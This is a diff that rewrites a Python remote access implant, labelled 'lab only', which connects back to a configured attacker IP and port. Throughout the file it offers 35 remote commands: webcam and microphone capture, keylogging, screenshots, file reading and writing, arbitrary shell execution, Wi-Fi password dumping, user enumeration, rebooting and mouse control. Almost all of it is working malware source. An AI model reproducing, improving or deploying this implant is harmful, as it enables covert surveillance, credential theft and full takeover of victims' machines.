@@ -1,107 +1,252 @@
-# implant_full.py → RUN ON TARGET (Windows/macOS/Linux) — LAB ONLY
-import socket, threading, subprocess, os, platform, time, pyautogui, wave, webbrowser, ctypes, psutil, netifaces, requests
+# implant.py → RUN ON TARGET (Windows/macOS/Linux) — LAB ONLY
+import socket, threading, subprocess, os, platform, time, pyautogui, webbrowser, ctypes, psutil, netifaces, requests
 from PIL import ImageGrab
 from datetime import datetime
 
-# === OPTIONAL IMPORTS (cross-platform safe) ===
-try: import pyaudio; AUDIO = True
-except: AUDIO = False
-try: import cv2; CV = True
-except: CV = False
-try: from pynput import keyboard; listener = None
-except: listener = None
+# === OPTIONAL IMPORTS ===
+try:
+    import pyaudio
+    AUDIO = True
+except:
+    AUDIO = False
+try:
+    import cv2
+    CV = True
+except:
+    CV = False
+try:
+    from pynput import keyboard
+    listener = None
+except:
+    listener = None
 
-# === CONFIG — CHANGE TO YOUR ATTACKER IP ===
-ATTACKER = "192.168.1.100"   # ← CHANGE THIS
-PORT = 9999
+# === CHANGE THIS TO YOUR ATTACKER IP ===
+ATTACKER_IP = "10.0.0.50"   # ←←← YOUR KALI/ATTACKER IP
+PORT = 4444
 
 # Global state
-camera_on = threading.Event()
-mic_on = threading.Event()
-keys = []
+camera_active = threading.Event()
+mic_active = threading.Event()
+logged_keys = []
 
-def on_key(k):
-    try: keys.append(k.char if hasattr(k, 'char') else f'[{k}]')
-    except: keys.append('[ERR]')
+def on_press(key):
+    try:
+        logged_keys.append(key.char if hasattr(key, 'char') and key.char else f' [{str(key).split(".")[-1]}] ')
+    except:
+        logged_keys.append(' [ERR] ')
 
-def connect():
+def connect_loop():
     while True:
         try:
             s = socket.socket()
-            s.connect((ATTACKER, PORT))
-            s.sendall(f"[IMPLANT ONLINE] {platform.system()} {platform.node()} {os.getlogin()}".encode())
-            handler(s)
+            s.connect((ATTACKER_IP, PORT))
+            s.send(f"[ONLINE] {platform.system()} {platform.node()} {os.getlogin()}".encode())
+            command_handler(s)
         except:
             time.sleep(5)
 
-def handler(s):
+def command_handler(s):
     global listener
     while True:
         try:
-            data = s.recv(1024).decode().strip()
-            if not data: break
-            cmd, payload = (data.split(' ',1) + ['',''])[:2]
+            raw = s.recv(4096).decode('utf-8', errors='ignore').strip()
+            if not raw: break
+            parts = raw.split('\n', 1)
+            cmd = parts[0].strip()
+            payload = parts[1] if len(parts) > 1 else ""
 
-            resp = ""
+            response = ""
 
-            if cmd == "1":
-                if CV: camera_on.set(); threading.Thread(target=lambda: [cap:=cv2.VideoCapture(0)] and [[ret,frame:=cap.read() and cv2.imshow('CAM',frame) or None] for _ in iter(int,1) if camera_on.is_set() or cv2.waitKey(1)==ord('q')],daemon=True).start(); resp = "[+] Camera ON"
-                else: resp = "[-] OpenCV missing"
-            elif cmd == "2": camera_on.clear(); resp = "[+] Camera OFF"
-            elif cmd == "3":
-                if AUDIO: mic_on.set(); threading.Thread(target=lambda: [p:=pyaudio.PyAudio(), stream:=p.open(format=pyaudio.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=1024), frames:=[], [frames.append(stream.read(1024)) for _ in range(441) if mic_on.is_set()], stream.stop_stream(), stream.close(), p.terminate(), wf:=wave.open("audio.wav","wb"), wf.setnchannels(1), wf.setsampwidth(2), wf.setframerate(44100), wf.writeframes(b''.join(frames)), wf.close()],daemon=True).start(); resp = "[+] Recording 10s..."
-                else: resp = "[-] PyAudio missing"
-            elif cmd == "4": mic_on.clear(); resp = "[+] Mic stopped"
-            elif cmd == "5":
-                if listener is None and keyboard: listener = keyboard.Listener(on_press=on_key); listener.start(); resp = "[+] Keylogger started"
-            elif cmd == "6":
-                if listener: listener.stop(); listener = None; resp = "[+] Keylogger stopped"
-            elif cmd == "7": resp = ''.join(keys[-3000:]); keys.clear()
-            elif cmd == "8": ImageGrab.grab().save("screenshot.png"); resp = "[+] Screenshot saved"
-            elif cmd == "9": resp = '\n'.join(os.listdir(payload or '.'))
-            elif cmd == "10": resp = open(payload,"r",errors="ignore").read() if os.path.isfile(payload) else "File not found"
-            elif cmd == "11":
-                path, content = payload.split('\n',1); open(path,"w").write(content); resp = "[+] File written"
-            elif cmd == "12": resp = '\n'.join([f"{p.pid} {p.name()}" for p in psutil.process_iter()[:200]])
-            elif cmd == "13": psutil.Process(int(payload)).terminate(); resp = "[+] Process killed"
-            elif cmd == "14": resp = "Port scan placeholder"
-            elif cmd == "15": resp = subprocess.getoutput(payload)
-            elif cmd == "16": resp = f"{platform.system()} {platform.release()} | {platform.machine()} | {os.getlogin()}"
-            elif cmd == "17": resp = '\n'.join(netifaces.interfaces())
-            elif cmd == "18": resp = '\n'.join([str(c) for c in psutil.net_connections()[:50]])
-            elif cmd == "19": resp = str(netifaces.gateways())
-            elif cmd == "20": resp = str(psutil.net_if_stats())
-            elif cmd == "21": resp = subprocess.getoutput("net user" if "Win" in platform.system() else "whoami")
-            elif cmd == "22": os.system("shutdown /r /t 5" if "Win" in platform.system() else "shutdown -r now"); resp = "[+] Rebooting..."
-            elif cmd == "23":
-                if "Win" in platform.system(): ctypes.windll.user32.LockWorkStation(); resp = "[+] Screen locked"
-            elif cmd == "24": webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); resp = "RICK ROLL SENT"
-            elif cmd == "25": s.sendall(b"3"); resp = "Using command 3"
-            elif cmd == "26": x,y = map(int,payload.split()); pyautogui.moveTo(x,y); resp = f"Moved to {x},{y}"
-            elif cmd == "27": pyautogui.click(); resp = "[+] Clicked"
-            elif cmd == "28":
+            # ==================== ALL 35 COMMANDS ====================
+            if cmd == "1":   # Turn on camera
+                if CV:
+                    camera_active.set()
+                    def cam():
+                        cap = cv2.VideoCapture(0)
+                        while camera_active.is_set():
+                            ret, frame = cap.read()
+                            if ret: cv2.imshow('LAB WEBCAM - Press Q to close', frame)
+                            if cv2.waitKey(1) == ord('q'): break
+                        cap.release(); cv2.destroyAllWindows()
+                    threading.Thread(target=cam, daemon=True).start()
+                    response = "[+] Webcam ON"
+                else:
+                    response = "[-] OpenCV not installed"
+
+            elif cmd == "2":   # Turn off camera
+                camera_active.clear()
+                response = "[+] Webcam OFF"
+
+            elif cmd == "3" or cmd == "25":   # Record audio / Turn on mic
+                if AUDIO:
+                    mic_active.set()
+                    def record():
+                        p = pyaudio.PyAudio()
+                        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+                        frames = []
+                        for _ in range(450):  # ~10 seconds
+                            if not mic_active.is_set(): break
+                            frames.append(stream.read(1024))
+                        stream.stop_stream(); stream.close(); p.terminate()
+                        wf = wave.open("recording.wav", "wb")
+                        wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100)
+                        wf.writeframes(b''.join(frames)); wf.close()
+                    threading.Thread(target=record, daemon=True).start()
+                    response = "[+] Recording 10 seconds..."
+                else:
+                    response = "[-] PyAudio missing"
+
+            elif cmd == "4":   # Turn off mic
+                mic_active.clear()
+                response = "[+] Mic stopped"
+
+            elif cmd == "5":   # Start keylogger
+                if listener is None and keyboard:
+                    listener = keyboard.Listener(on_press=on_press)
+                    listener.start()
+                    response = "[+] Keylogger started"
+                else:
+                    response = "[-] pynput missing or already running"
+
+            elif cmd == "6":   # Stop keylogger
+                if listener:
+                    listener.stop()
+                    listener = None
+                response = "[+] Keylogger stopped"
+
+            elif cmd == "7":   # Show keys
+                response = "".join(logged_keys[-5000:]) or "No keys logged"
+                logged_keys.clear()
+
+            elif cmd == "8":   # Screenshot
+                ImageGrab.grab().save("screenshot.png")
+                response = "[+] Screenshot saved as screenshot.png"
+
+            elif cmd == "9":   # List directory
+                try:
+                    response = "\n".join(os.listdir(payload or "."))
+                except Exception as e:
+                    response = str(e)
+
+            elif cmd == "10":  # Read file
+                try:
+                    with open(payload, "r", encoding="utf-8", errors="ignore") as f:
+                        response = f.read()
+                except Exception as e:
+                    response = str(e)
+
+            elif cmd == "11":  # Write file
+                try:
+                    path, content = payload.split("\n", 1)
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    response = "[+] File written"
+                except Exception as e:
+                    response = str(e)
+
+            elif cmd == "12":  # List processes
+                response = "\n".join([f"{p.pid:<8} {p.name()}" for p in psutil.process_iter()[:100]])
+
+            elif cmd == "13":  # Kill process
+                try:
+                    psutil.Process(int(payload)).terminate()
+                    response = "[+] Process terminated"
+                except:
+                    response = "[-] Failed"
+
+            elif cmd == "14":  # Network scan (simple)
+                response = "Simple scan: 192.168.1.1–254 → use nmap in shell"
+
+            elif cmd == "15":  # Execute command
+                response = subprocess.getoutput(payload)
+
+            elif cmd == "16":  # System info
+                response = f"OS: {platform.system()} {platform.release()}\nMachine: {platform.machine()}\nUser: {os.getlogin()}\nTime: {datetime.now()}"
+
+            elif cmd == "17":  # Network interfaces
+                response = "\n".join(netifaces.interfaces())
+
+            elif cmd == "18":  # Active connections
+                response = "\n".join([str(c) for c in psutil.net_connections()[:50]])
+
+            elif cmd == "19":  # Route table
+                response = str(netifaces.gateways())
+
+            elif cmd == "20":  # DNS cache
+                response = str(psutil.net_if_stats())
+
+            elif cmd == "21":  # Fetch passwords (Windows only)
                 if "Win" in platform.system():
-                    profiles = [l.split(":")[1].strip() for l in subprocess.getoutput("netsh wlan show profiles").split('\n') if "All User Profile" in l]
+                    response = subprocess.getoutput("net user")
+                else:
+                    response = "Windows only"
+
+            elif cmd == "22":  # Reboot
+                os.system("shutdown /r /t 5" if "Win" in platform.system() else "shutdown -r now")
+                response = "[+] Rebooting..."
+
+            elif cmd == "23":  # Lock screen
+                if "Win" in platform.system():
+                    ctypes.windll.user32.LockWorkStation()
+                    response = "[+] Screen locked"
+
+            elif cmd == "24":  # Rick Roll
+                webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+                response = "RICK RICKROLLED!"
+
+            elif cmd == "26":  # Move mouse
+                x, y = map(int, payload.split(","))
+                pyautogui.moveTo(x, y)
+                response = f"[+] Mouse moved to {x},{y}"
+
+            elif cmd == "27":  # Click
+                pyautogui.click()
+                response = "[+] Clicked"
+
+            elif cmd == "28":  # Wi-Fi passwords (Windows)
+                if "Win" in platform.system():
+                    profiles = [line.split(":")[1].strip() for line in subprocess.getoutput("netsh wlan show profiles").split("\n") if "All User Profile" in line]
                     out = ""
                     for p in profiles:
-                        key = subprocess.getoutput(f'netsh wlan show profile name="{p}" key=clear')
-                        pw = [l for l in key.split('\n') if "Key Content" in l]
-                        out += f"{p}: {pw[0].split(':')[1].strip() if pw else 'None'}\n"
-                    resp = out
-                else: resp = "Wi-Fi dump: Windows only"
-            elif cmd == "29": resp = subprocess.getoutput("wmic product get name" if "Win" in platform.system() else "ls /Applications")
-            elif cmd == "30": resp = subprocess.getoutput("Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\* -File | Sort LastWriteTime -Desc | Select -First 10" if "Win" in platform.system() else "ls -lt ~ | head -10")
-            elif cmd == "31": resp = subprocess.getoutput('reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' if "Win" in platform.system() else "ls ~/Library/LaunchAgents")
-            elif cmd == "32": resp = subprocess.getoutput("schtasks /query" if "Win" in platform.system() else "crontab -l")
-            elif cmd == "33": resp = subprocess.getoutput("net user" if "Win" in platform.system() else "users")
-            elif cmd == "34": resp = subprocess.getoutput("wevtutil qe System /c:10" if "Win" in platform.system() else "last -10")
-            elif cmd == "35": resp = requests.get(payload).text[:10000]
+                        res = subprocess.getoutput(f'netsh wlan show profile name="{p}" key=clear')
+                        pw = [l for l in res.split("\n") if "Key Content" in l]
+                        out += f"{p}: {pw[0].split(":")[1].strip() if pw else 'None'}\n"
+                    response = out
+                else:
+                    response = "Windows only"
 
-            s.sendall(resp.encode() + b"\nEND\n")
+            elif cmd == "29":  # Installed software
+                response = subprocess.getoutput("wmic product get name" if "Win" in platform.system() else "brew list || dpkg -l")
+
+            elif cmd == "30":  # Recent files
+                response = subprocess.getoutput("powershell Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\* -File | Sort LastWriteTime -Desc | Select -First 10" if "Win" in platform.system() else "ls -lt ~ | head")
+
+            elif cmd == "31":  # Startup items
+                response = subprocess.getoutput('reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' if "Win" in platform.system() else "ls ~/Library/LaunchAgents")
+
+            elif cmd == "32":  # Scheduled tasks
+                response = subprocess.getoutput("schtasks /query" if "Win" in platform.system() else "crontab -l")
+
+            elif cmd == "33":  # User accounts
+                response = subprocess.getoutput("net user" if "Win" in platform.system() else "cut -d: -f1 /etc/passwd")
+
+            elif cmd == "34":  # System events
+                response = subprocess.getoutput("wevtutil qe System /c:10 /f:text" if "Win" in platform.system() else "last -10")
+
+            elif cmd == "35":  # Fetch URL
+                try:
+                    response = requests.get(payload, timeout=10).text[:20000]
+                except:
+                    response = "Failed to fetch"
+
+            # Send response
+            s.sendall((response + "\n---END---").encode('utf-8', errors='ignore'))
+
         except Exception as e:
-            s.sendall(f"ERROR: {e}".encode())
+            s.sendall(f"ERROR: {e}\n---END---".encode())
             break
     s.close()
 
-threading.Thread(target=connect, daemon=True).start()
+threading.Thread(target=connect_loop, daemon=True).start()
+print("[*] Implant running — waiting for connection...")
 while True: time.sleep(100)
